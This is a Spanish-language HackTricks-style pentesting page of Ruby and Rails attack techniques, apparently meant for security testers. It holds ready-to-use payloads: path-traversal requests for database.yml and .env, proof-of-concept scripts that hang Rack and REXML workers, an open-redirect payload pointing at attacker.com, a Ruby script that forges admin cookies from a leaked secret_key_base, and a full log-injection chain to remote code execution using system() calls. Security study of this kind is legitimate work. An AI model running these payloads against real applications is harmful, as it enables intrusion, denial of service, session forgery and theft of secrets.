# Trucos de Ruby

{{#include ../../banners/hacktricks-training.md}}

## Subida de archivos a RCE

Como se explica en [this article](https://www.offsec.com/blog/cve-2024-46986/), subir un archivo `.rb` a directorios sensibles como `config/initializers/` puede llevar a remote code execution (RCE) en aplicaciones Ruby on Rails.

Consejos:
- Otras ubicaciones de boot/eager-load que se ejecutan al inicio de la app también son riesgosas si son escribibles (p. ej., `config/initializers/` es la clásica). Si encuentras una subida de archivos arbitraria que caiga en cualquier lugar bajo `config/` y luego sea evaluada/requerida, podrías obtener RCE al iniciar.
- Busca builds dev/staging que copien archivos controlados por el usuario dentro de la container image donde Rails los cargará al boot.

## Active Storage image transformation → command execution (CVE-2025-24293)

Cuando una aplicación usa Active Storage con `image_processing` + `mini_magick`, y pasa parámetros no confiables a métodos de transformación de imágenes, versiones de Rails anteriores a 7.1.5.2 / 7.2.2.2 / 8.0.2.1 podrían permitir inyección de comandos porque algunos métodos de transformación se permitieron por error por defecto.

- Un patrón vulnerable se ve así:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
donde `params[:t]` y/o `params[:v]` están controlados por el atacante.

- Qué probar durante las pruebas
- Identifica cualquier endpoint que acepte opciones de variant/processing, nombres de transformación o argumentos arbitrarios para ImageMagick.
- Fuzzea `params[:t]` y `params[:v]` buscando errores sospechosos o efectos laterales de ejecución. Si puedes influir en el nombre del método o pasar argumentos crudos que lleguen a MiniMagick, podrías conseguir code exec en el host que procesa las imágenes.
- Si solo tienes acceso de lectura a variantes generadas, intenta exfiltración ciega vía operaciones ImageMagick manipuladas.

- Remediación/detecciones
- Si ves Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 con Active Storage + `image_processing` + `mini_magick` y transformaciones controladas por el usuario, considéralo explotable. Recomienda actualizar y aplicar allowlists estrictas para métodos/params y una política de ImageMagick endurecida.

## Rack::Static LFI / path traversal (CVE-2025-27610)

Si la stack objetivo usa middleware de Rack directamente o a través de frameworks, versiones de `rack` anteriores a 2.2.13, 3.0.14 y 3.1.12 permiten Local File Inclusion vía `Rack::Static` cuando `:root` no está establecido/está mal configurado. Traversal codificado en `PATH_INFO` puede exponer archivos bajo el directorio de trabajo del proceso o un root inesperado.

- Busca apps que monten `Rack::Static` en `config.ru` o en stacks de middleware. Prueba traversals codificados contra rutas estáticas, por ejemplo:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Ajusta el prefijo para que coincida con los `urls:` configurados. Si la app responde con el contenido de archivos, probablemente tienes LFI a cualquier cosa bajo el `:root` resuelto.

- Mitigación: actualiza Rack; asegura que `:root` apunte únicamente a un directorio de archivos públicos y esté establecido explícitamente.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` y < `2.2.8.1` gastaba tiempo superlineal parseando cabeceras `Content-Type: multipart/form-data` especialmente construidas. Un único POST con una lista gigantesca de parámetros `A=` puede bloquear un worker de Puma/Unicorn y causar DoS o agotamiento de la cola de peticiones.

- Quick PoC (colgará un worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Funciona contra cualquier stack basado en Rack (Rails/Sinatra/Hanami/Grape). Si va por delante nginx/haproxy con keep-alive, repite en paralelo para agotar los workers.
- Corregido haciendo que el parser sea lineal; busca la gem `rack` con versión < `3.0.9.1` o < `2.2.8.1`. En las evaluaciones, señala que los WAFs rara vez bloquean esto porque la cabecera es sintácticamente válida.

## REXML XML parser ReDoS (CVE-2024-49761)

La gem REXML < 3.3.9 (Ruby 3.1 y anteriores) retrocede catastróficamente al parsear referencias numéricas de caracteres hexadecimales que contienen largas secuencias de dígitos (p. ej., `&#1111111111111x41;`). Cualquier XML procesado por REXML o por librerías que lo envuelven (clientes SOAP/XML API, SAML, uploads SVG) puede ser abusado para saturar la CPU.

Minimal trigger contra un endpoint Rails que parsea XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
If the process stays busy for seconds and worker CPU spikes, it is likely vulnerable. Attack is low bandwidth and affects background jobs that ingest XML as well.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Apps using the `cgi` gem (default in many Rack stacks) can be frozen with a single malicious header:
- `CGI::Cookie.parse` was super-linear; huge cookie strings (thousands of delimiters) trigger O(N²) behavior.
- `CGI::Util#escapeElement` regex allowed ReDoS on HTML escaping.

Both issues are fixed in `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. For pentests, drop a massive `Cookie:` header or feed untrusted HTML to helper code and watch for worker lockup. Combine with keep-alive to amplify.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

The `googlesign_in` gem < 1.3.0 (used for Google OAuth on Rails) performed an incomplete same-origin check on the `proceedto` parameter. A malformed URL like `proceedto=//attacker.com/%2F..` bypasses the check and redirects the user off-site while preserving Rails flash/session cookies.

Exploit flow:
1. Victim clicks crafted Google Sign-In link hosted by attacker.
2. After authentication, the gem redirects to attacker-controlled domain, leaking flash notices or any data stored in cookies scoped to the wildcard domain.
3. If the app stores short-lived tokens or magic links in flash, this can be turned into account takeover.

During testing, grep Gemfile.lock for `googlesign_in` < 1.3.0 and try malformed `proceedto` values. Confirm via Location header and cookie reflection.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails encrypts and signs cookies using keys derived from `secret_key_base`. If that value leaks (e.g., in a repo, logs, or misconfigured credentials), you can usually decrypt, modify, and re-encrypt cookies. This often leads to authz bypass if the app stores roles, user IDs, or feature flags in cookies.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby para descifrar/forjar cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Notas:
- Las aplicaciones más antiguas pueden usar AES-256-CBC y salts `encrypted cookie` / `signed encrypted cookie`, o serializadores JSON/Marshal. Ajusta salts, cipher y serializer en consecuencia.
- En caso de compromiso/evaluación, rota `secret_key_base` para invalidar todas las cookies existentes.

## Véase también (vulnerabilidades específicas de Ruby/Rails)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

When an app (often a simple Rack/Sinatra/Rails endpoint) both:
- registra una cadena controlada por el usuario tal cual, y
- más tarde realiza un `load` de un archivo cuya ruta se deriva de esa misma cadena (después de `Pathname#cleanpath`),

A menudo puedes lograr ejecución remota de código envenenando el registro y luego forzando a la app a `load` el archivo de log. Primitivas clave:

- Ruby `load` evalúa el contenido del archivo objetivo como Ruby independientemente de la extensión del archivo. Cualquier archivo de texto legible cuyo contenido se analice como Ruby será ejecutado.
- `Pathname#cleanpath` colapsa los segmentos `.` y `..` sin acceder al sistema de archivos, habilitando path smuggling: basura controlada por el atacante puede anteponerse para el registro mientras la ruta limpiada aún resuelve al archivo previsto para ejecutar (p. ej., `../logs/error.log`).

### Minimal vulnerable pattern
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Por qué el log puede contener Ruby válido
`Logger` escribe líneas de prefijo como:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
En Ruby, `#` inicia un comentario y `9/2/2025` es solo aritmética. Para inyectar código Ruby válido necesitas:
- Comenzar tu payload en una nueva línea para que no sea comentado por el `#` en la INFO line; envía una nueva línea inicial (`\n` o `%0A`).
- Cerrar el `[` colgante introducido por la INFO line. Un truco común es comenzar con `]` y opcionalmente contentar al parser con `][0]=1`.
- Luego colocar Ruby arbitrario (p. ej., `system(...)`).

Ejemplo de lo que terminará en el log después de una request con un crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Colar una sola cadena que a la vez registra código y resuelve a la ruta del log
Queremos una única cadena controlada por el atacante que:
- cuando se registra sin procesar, contenga nuestro payload de Ruby, y
- cuando se pase por `Pathname.new(<input>).cleanpath`, resuelva a `../logs/error.log` para que el posterior `load` ejecute el archivo de log recién envenenado.

`Pathname#cleanpath` ignora los schemes y colapsa los componentes de traversal, así que lo siguiente funciona:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- El `#` antes de `://` hace que Ruby ignore el resto cuando se ejecuta el log, mientras que `cleanpath` aún reduce el sufijo a `../logs/error.log`.
- La nueva línea inicial rompe la línea INFO; `]` cierra el corchete colgante; `][0]=1` satisface al parser.

### Explotación de extremo a extremo
1. Envía lo siguiente como el nombre del script de backup (URL-encode la primera nueva línea como `%0A` si es necesario):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. La app registra tu cadena sin procesar en `logs/error.log`.
3. La app calcula `cleanpath` que se resuelve a `../logs/error.log` y llama a `load` sobre él.
4. Ruby ejecuta el código que inyectaste en el log.

Para exfiltrar un archivo en un entorno tipo CTF:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (el primer carácter es un salto de línea):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Referencias

- [Rails Security Announcement: CVE-2025-24293 Active Storage unsafe transformation methods (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub Advisory: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath docs](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [How Ruby load works](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS advisory (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby security advisories for CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
